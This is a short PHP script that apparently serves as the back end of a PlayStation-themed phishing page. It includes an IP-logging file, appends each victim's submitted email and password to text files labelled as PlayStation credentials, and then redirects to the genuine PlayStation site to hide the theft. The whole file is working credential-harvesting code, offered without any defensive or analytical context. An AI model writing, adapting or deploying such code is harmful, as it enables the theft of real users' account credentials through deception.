<?php
include 'ip.php';
file_put_contents("usernames.txt", "PlayStation username : " . $email = $_POST['email'] . "\n", FILE_APPEND);
?>
<?php
file_put_contents("pass.txt", "PlayStation Password : " . $pass = $_POST['pass'] . "\n", FILE_APPEND);
header('Location: https://www.playstation.com/en-in/');
?>
